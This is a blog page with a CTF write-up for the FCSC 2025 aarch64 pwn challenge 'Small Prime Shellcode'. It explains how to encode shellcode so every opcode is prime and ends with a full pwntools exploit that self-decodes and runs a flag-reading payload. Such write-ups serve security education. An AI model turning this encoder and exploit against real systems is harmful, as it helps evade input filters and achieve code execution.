@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>0xb0tm4n&#x27;s website</title>
+  <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"
+    integrity="sha256-WCzAhd2P6gRJF9Hv3oOOd+hFJi/QJbv+Azn4CGB8gfY=" crossorigin="anonymous" defer></script>
+  <script src="/js/index.js" defer></script>
+  <script src="/js/prompt.js" defer></script>
+  <script src="/js/keyboard.js" defer></script>
+  <script src="/js/tab.js" defer></script>
+  <script src="/js/commands.js" defer></script>
+  <script src="/js/config.js" defer></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="/css/page.css"></head><body onkeydown='exec(event)' style='background-image: url("/assets/background.jpg");'><main>
+      <div class="files" id="files" tabindex="0">
+<ul>
+  <li class="file">
+    <span><a href='https://super-botman.github.io/readme/'
+      tabindex="0">  README</a></span>
+  </li>
+
+<li class="folder"><span>
+      <a href='https://super-botman.github.io/pwn/'
+        tabindex="0">  Pwn
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/pwn/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/robot/'
+        tabindex="0">  FCSC 2023 | Robot</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/bigorneau/'
+        tabindex="0">  FCSC 2025 | Bigorneau</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/http3/'
+        tabindex="0">  FCSC 2025 | HTTP3</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a class="selected"href='https://super-botman.github.io/pwn/writeups/small-prime-shellcode/'
+        tabindex="0">  FCSC 2025 | Small Prime Shellcode</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/aarchibald/'
+        tabindex="0">  Hackropole | Aarchibald</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/alfred/'
+        tabindex="0">  Hackropole | Alfred</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/armigo/'
+        tabindex="0">  Hackropole | Armigo</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/pwn103/'
+        tabindex="0">  THM | pwn101 task 103</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li><li class="folder"><span>
+      <a href='https://super-botman.github.io/web/'
+        tabindex="0">  Web
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/web/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/boiler/'
+        tabindex="0">  THM | Boiler</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/thomghost/'
+        tabindex="0">  THM | Thomghost</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li>
+</ul>
+</div>
+      <div class="viewer page" id="viewer" tabindex="0">
+        <div class="tab">
+<div class="file-manager" onclick='document.getElementById("files").classList.toggle("open"); document.getElementById("content").classList.toggle("close")'> </div>
+<ul id="tabs">
+</ul>
+
+
+</div>
+        <div class="content" id="content"><h1 id="pwn-small-prime-shellcode-fcsc-2025">[Pwn] Small Prime Shellcode | FCSC 2025</h1>
+<ul>
+<li><a href="https://super-botman.github.io/pwn/writeups/small-prime-shellcode/#checksecs">1. Checksec</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/small-prime-shellcode/#writeup">2. Writeup</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/small-prime-shellcode/#full-exploit">3. Full exploit</a></li>
+</ul>
+<h2 id="checksecs">Checksecs</h2>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span>[*] &#39;/home/botman/Documents/challenges/FCSC/small_prime_shellcode/small-primes-shellcode&#39;
+</span><span>    Arch:       aarch64-64-little
+</span><span>    RELRO:      Partial RELRO
+</span><span>    Stack:      No canary found
+</span><span>    NX:         NX enabled
+</span><span>    PIE:        PIE enabled
+</span><span>    Stripped:   No
+</span></code></pre>
+<h2 id="tl-dr">TL;DR</h2>
+<p>Constraints: only prime opcodes</p>
+<p>Solution:</p>
+<ul>
+<li>Encode shellcode to use only prime opcodes</li>
+<li>Generate a decoder</li>
+<li>Send decoder + encoded shellcode</li>
+</ul>
+<h2 id="writeup">Writeup</h2>
+<p>For this challenge, the only constraint for our shellcode was to use <strong>only 6 prime opcodes</strong>.</p>
+<p>To create this shellcode, I started by searching through the <a href="https://developer.arm.com/documentation/ddi0602/2025-03?lang=en">ARM documentation</a>. I found some small results, but discovered a terrible truth: with this constraint, it was <strong>impossible</strong> to change the value of <code>x8</code>, and since <code>x8</code> stores the <a href="https://arm64.syscall.sh/">syscall number</a>, it was impossible to make any syscalls this way.</p>
+<blockquote>
+<p><span style="color: #82aaff;"><strong> NOTES</strong></span></p>
+<p>Changing the value of <code>x8</code> was impossible because, in ARM, the destination register is always located at the end of the opcode. All instructions allowing a write to <code>x8</code> ended with an 8 and, therefore, weren't prime numbers.</p>
+</blockquote>
+<p>After some tears and a little depression, I reconnected my brain and started generating a <strong>2.7GB</strong> file containing all possible opcodes—and finally found a solution.</p>
+<p><img src="/images/small-primes-shellcode/meme.jpg" alt="meme" /></p>
+<p>Basically, I wrote a shellcode that restores the payload during execution. To ensure only prime opcodes, I:</p>
+<ol>
+<li>Found the next prime number for each opcode in the payload.</li>
+<li>Calculated the difference between the two.</li>
+<li>During execution, subtracted the difference from the prime number to recover the original payload.</li>
+</ol>
+<p>I did a lot of <code>grep</code> to find what I needed. I finally selected these instructions:</p>
+<pre data-lang="asm" style="background-color:#1a1b26;color:#c0caf5;" class="language-asm "><code class="language-asm" data-lang="asm"><span style="color:#7aa2f7;">adds w1</span><span>, </span><span style="color:#7aa2f7;">w1</span><span>, </span><span style="color:#7aa2f7;">#</span><span style="color:#bb9af7;">4
+</span><span style="color:#7aa2f7;">ldr w5</span><span>, [</span><span style="color:#7aa2f7;">x0</span><span>, </span><span style="color:#7aa2f7;">w1</span><span>, </span><span style="color:#7aa2f7;">uxtw</span><span>]
+</span><span>
+</span><span style="color:#bb9af7;">add </span><span style="color:#7aa2f7;">w5</span><span>, </span><span style="color:#7aa2f7;">w5</span><span>, </span><span style="color:#7aa2f7;">#&lt;number&gt;
+</span><span style="color:#bb9af7;">sub </span><span style="color:#7aa2f7;">w5</span><span>, </span><span style="color:#7aa2f7;">w5</span><span>, </span><span style="color:#7aa2f7;">#&lt;number&gt;
+</span><span>
+</span><span style="color:#7aa2f7;">adds w23</span><span>, </span><span style="color:#7aa2f7;">w23</span><span>, </span><span style="color:#7aa2f7;">#</span><span style="color:#bb9af7;">25
+</span><span style="color:#7aa2f7;">subs w23</span><span>, </span><span style="color:#7aa2f7;">w23</span><span>, </span><span style="color:#7aa2f7;">#</span><span style="color:#bb9af7;">0
+</span><span style="color:#bb9af7;">str </span><span style="color:#7aa2f7;">w5</span><span>, [</span><span style="color:#7aa2f7;">x0</span><span>, </span><span style="color:#7aa2f7;">w23</span><span>, </span><span style="color:#7aa2f7;">uxtw</span><span>]
+</span></code></pre>
+<p>What do they do?</p>
+<p>First, I use <code>w1</code> and <code>w23</code> as counters. They allow me to load the encoded payload into <code>w5</code> using <code>ldr</code>, and then store the decoded one back with <code>str</code>. Between these two, I apply an <code>add</code> and a <code>sub</code> on the opcode prime number stored in <code>w5</code>.</p>
+<p>You may ask why I use both <code>add</code> and <code>sub</code> instead of just <code>sub</code>. This is because of the first constraint: I can't <code>add</code> and <code>sub</code> arbitrary numbers. So I extracted all possible opcode values and wrote them into <code>registers.py</code>. With these values, I created a small function that takes a target number and a list of available <code>add/sub</code> values, and returns the operations needed.</p>
+<p>All I had to do was put everything into an exploit and boom:</p>
+<h2 id="full-exploit">Full exploit</h2>
+<pre data-lang="python" style="background-color:#1a1b26;color:#c0caf5;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#7dcfff;">from </span><span>pwn </span><span style="color:#7dcfff;">import </span><span style="color:#ff9e64;">*
+</span><span style="color:#7dcfff;">from </span><span>sympy </span><span style="color:#7dcfff;">import </span><span>nextprime
+</span><span style="color:#7dcfff;">import </span><span>registers
+</span><span>
+</span><span style="color:#ff9e64;">CHALL </span><span style="color:#89ddff;">= &quot;</span><span style="color:#9ece6a;">./small-primes-shellcode</span><span style="color:#89ddff;">&quot;
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">opps</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">target</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">add_list</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">sub_list</span><span style="color:#9abdf5;">):
+</span><span>    </span><span style="color:#bb9af7;">for </span><span>add </span><span style="color:#bb9af7;">in </span><span>add_list</span><span style="color:#9abdf5;">:
+</span><span>        sub_target </span><span style="color:#89ddff;">= </span><span>add </span><span style="color:#89ddff;">- </span><span>target
+</span><span>        sub_idx </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">sub_list</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">index</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">sub_target</span><span style="color:#9abdf5;">) </span><span style="color:#bb9af7;">if </span><span>sub_target </span><span style="color:#bb9af7;">in </span><span>sub_list </span><span style="color:#bb9af7;">else </span><span style="color:#ff9e64;">None
+</span><span>        </span><span style="color:#bb9af7;">if </span><span>sub_idx</span><span style="color:#9abdf5;">:
+</span><span>            sub </span><span style="color:#89ddff;">= </span><span>sub_list</span><span style="color:#9abdf5;">[</span><span>sub_idx</span><span style="color:#9abdf5;">]
+</span><span>            </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#9abdf5;">[</span><span>add</span><span style="color:#89ddff;">, </span><span>sub</span><span style="color:#9abdf5;">]
+</span><span>    </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#ff9e64;">None
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">encode_shellcode</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">shellcode</span><span style="color:#9abdf5;">):
+</span><span>    payload </span><span style="color:#89ddff;">= </span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;&#39;
+</span><span>    conv_table </span><span style="color:#89ddff;">= </span><span style="color:#9abdf5;">[]
+</span><span>    shellcode </span><span style="color:#89ddff;">= </span><span style="color:#0db9d7;">bytes</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">asm</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">shellcode</span><span style="color:#9abdf5;">))
+</span><span>
+</span><span>    </span><span style="color:#bb9af7;">for </span><span>i </span><span style="color:#bb9af7;">in </span><span style="color:#2ac3de;">range</span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">, </span><span style="color:#2ac3de;">len</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">shellcode</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">, </span><span style="color:#ff9e64;">4</span><span style="color:#9abdf5;">):
+</span><span>        opcode </span><span style="color:#89ddff;">= </span><span style="color:#0db9d7;">int</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">from_bytes</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">shellcode</span><span style="color:#9abdf5;">[</span><span style="color:#7aa2f7;">i</span><span style="color:#89ddff;">:</span><span style="color:#7aa2f7;">i</span><span style="color:#89ddff;">+</span><span style="color:#ff9e64;">4</span><span style="color:#9abdf5;">][</span><span style="color:#89ddff;">::-</span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">])
+</span><span>        prime </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">nextprime</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">opcode</span><span style="color:#9abdf5;">)
+</span><span>
+</span><span>        payload </span><span style="color:#89ddff;">+= </span><span style="color:#7aa2f7;">p32</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">prime</span><span style="color:#9abdf5;">)
+</span><span>        </span><span style="color:#7aa2f7;">conv_table</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">append</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">prime </span><span style="color:#89ddff;">- </span><span style="color:#7aa2f7;">opcode</span><span style="color:#9abdf5;">)
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#bb9af7;">return </span><span>payload, conv_table
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">gen_decoder</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">conv_table</span><span style="color:#9abdf5;">):
+</span><span>    code </span><span style="color:#89ddff;">= &#39;&#39;
+</span><span>    </span><span style="color:#bb9af7;">for </span><span>diff </span><span style="color:#bb9af7;">in </span><span>conv_table</span><span style="color:#9abdf5;">:
+</span><span>        w5 </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">opps</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">-</span><span style="color:#7aa2f7;">diff</span><span style="color:#89ddff;">, </span><span style="color:#7aa2f7;">registers</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">a_w5</span><span style="color:#89ddff;">, </span><span style="color:#7aa2f7;">registers</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">s_w5</span><span style="color:#9abdf5;">)
+</span><span>
+</span><span>        code </span><span style="color:#89ddff;">+= &#39;&#39;&#39;
+</span><span style="color:#9ece6a;">        adds w1, w1, #4
+</span><span style="color:#9ece6a;">        ldr w5, [x0, w1, uxtw]
+</span><span style="color:#9ece6a;">
+</span><span style="color:#9ece6a;">        add w5, w5, #</span><span>%i
+</span><span style="color:#9ece6a;">        sub w5, w5, #</span><span>%i
+</span><span style="color:#9ece6a;">
+</span><span style="color:#9ece6a;">        adds w23, w23, #25
+</span><span style="color:#9ece6a;">        subs w23, w23, #21
+</span><span style="color:#9ece6a;">        str w5, [x0, w23, uxtw]
+</span><span style="color:#9ece6a;">        </span><span style="color:#89ddff;">&#39;&#39;&#39; % </span><span style="color:#9abdf5;">(</span><span>w5</span><span style="color:#9abdf5;">[</span><span style="color:#ff9e64;">0</span><span style="color:#9abdf5;">]</span><span style="color:#89ddff;">, </span><span>w5</span><span style="color:#9abdf5;">[</span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">])
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#0db9d7;">bytes</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">asm</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">code</span><span style="color:#9abdf5;">))
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">gen_prefix</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">length</span><span style="color:#9abdf5;">):
+</span><span>    w1 </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">opps</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">length</span><span style="color:#89ddff;">+</span><span style="color:#ff9e64;">16</span><span style="color:#89ddff;">, </span><span style="color:#7aa2f7;">registers</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">a_w1</span><span style="color:#89ddff;">, </span><span style="color:#7aa2f7;">registers</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">s_w1</span><span style="color:#9abdf5;">)
+</span><span>    w23 </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">opps</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">length</span><span style="color:#89ddff;">+</span><span style="color:#ff9e64;">16</span><span style="color:#89ddff;">, </span><span style="color:#7aa2f7;">registers</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">a_w23</span><span style="color:#89ddff;">, </span><span style="color:#7aa2f7;">registers</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">s_w23</span><span style="color:#9abdf5;">)
+</span><span>
+</span><span>    prefix </span><span style="color:#89ddff;">= &#39;&#39;&#39;
+</span><span style="color:#9ece6a;">    adds w1, w1, #</span><span>%i
+</span><span style="color:#9ece6a;">    subs w1, w1, #</span><span>%i
+</span><span style="color:#9ece6a;">
+</span><span style="color:#9ece6a;">    adds w23, w23, #</span><span>%i
+</span><span style="color:#9ece6a;">    subs w23, w23, #</span><span>%i
+</span><span style="color:#9ece6a;">    </span><span style="color:#89ddff;">&#39;&#39;&#39; % </span><span style="color:#9abdf5;">(</span><span>w1</span><span style="color:#9abdf5;">[</span><span style="color:#ff9e64;">0</span><span style="color:#9abdf5;">]</span><span style="color:#89ddff;">, </span><span>w1</span><span style="color:#9abdf5;">[</span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">]</span><span style="color:#89ddff;">, </span><span>w23</span><span style="color:#9abdf5;">[</span><span style="color:#ff9e64;">0</span><span style="color:#9abdf5;">]</span><span style="color:#89ddff;">, </span><span>w23</span><span style="color:#9abdf5;">[</span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">])
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#0db9d7;">bytes</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">asm</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">prefix</span><span style="color:#9abdf5;">))
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">exploit</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">io</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">elf</span><span style="color:#9abdf5;">):
+</span><span>    payload, conv_table </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">encode_shellcode</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">shellcraft</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">cat</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">flag.txt</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">))
+</span><span>    decoder </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">gen_decoder</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">conv_table</span><span style="color:#9abdf5;">)
+</span><span>    prefix </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">gen_prefix</span><span style="color:#9abdf5;">(</span><span style="color:#2ac3de;">len</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">decoder</span><span style="color:#9abdf5;">))
+</span><span>
+</span><span>    payload </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">flat</span><span style="color:#9abdf5;">(
+</span><span style="color:#7aa2f7;">        prefix</span><span style="color:#89ddff;">,
+</span><span style="color:#7aa2f7;">        decoder</span><span style="color:#89ddff;">,
+</span><span style="color:#7aa2f7;">        </span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;\x61\x02\x00\xd4&#39;,
+</span><span style="color:#7aa2f7;">        payload</span><span style="color:#89ddff;">,
+</span><span style="color:#7aa2f7;">    </span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">info</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">full payload size: </span><span>%i</span><span style="color:#9ece6a;"> bytes</span><span style="color:#89ddff;">&quot; % </span><span style="color:#2ac3de;">len</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">payload</span><span style="color:#9abdf5;">))
+</span><span>
+</span><span>    padding </span><span style="color:#89ddff;">= </span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&quot;\x0b\x00\x00\x00&quot;*</span><span style="color:#0db9d7;">int</span><span style="color:#9abdf5;">((</span><span style="color:#89ddff;">0x</span><span style="color:#ff9e64;">400</span><span style="color:#89ddff;">-</span><span style="color:#2ac3de;">len</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">payload</span><span style="color:#9abdf5;">))</span><span style="color:#89ddff;">/</span><span style="color:#ff9e64;">4</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">send</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">payload </span><span style="color:#89ddff;">+ </span><span style="color:#7aa2f7;">padding</span><span style="color:#9abdf5;">)
+</span><span>    flag </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recv</span><span style="color:#9abdf5;">()</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">decode</span><span style="color:#9abdf5;">()
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#bb9af7;">return </span><span>flag
+</span></code></pre>
+<p><a href="/exploits/small-primes-shellcode.py">download here</a></p>
+<p><strong>Written by <em>0xB0tm4n</em></strong></p>
+
+        </div>
+      </div>
+      <div class="prompt" id="terminal"><input
+    type="text"
+    id="setter"
+    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
+    onchange="writeit(this, event)"
+    onkeyup="writeit(this, event)"
+    onkeypress="writeit(this, event);"
+    >
+<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
+    </main>
+  </body>
+
+</html>
